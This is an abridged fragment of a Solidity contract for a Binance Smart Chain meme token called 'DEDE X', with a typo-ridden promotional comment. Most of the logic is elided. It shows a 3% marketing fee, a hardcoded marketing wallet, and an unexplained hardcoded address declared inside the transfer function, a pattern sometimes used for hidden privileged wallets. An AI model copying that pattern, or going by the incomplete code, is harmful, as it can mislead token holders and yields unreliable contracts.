/**
DEDE X ( DEDEX ) is a new hype meme token that build on Binance smart Chain as a Decentrallized and autonomous sytem that build and run for community. Our Main target fo are to make big utility that govern our farm and our new chain in upcoming future.
...
contract DEDEX is Context, IERC20, Ownable {
    ...
    string private constant _name = "DEDE X"; // 
    string private constant _symbol = "DEDEX"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 3;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x3F57190Df1a2072dF9b714f92431A952d9fb2Fbe;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0x4CB005145233F9d61c9dBa7447928EFbF530C721;
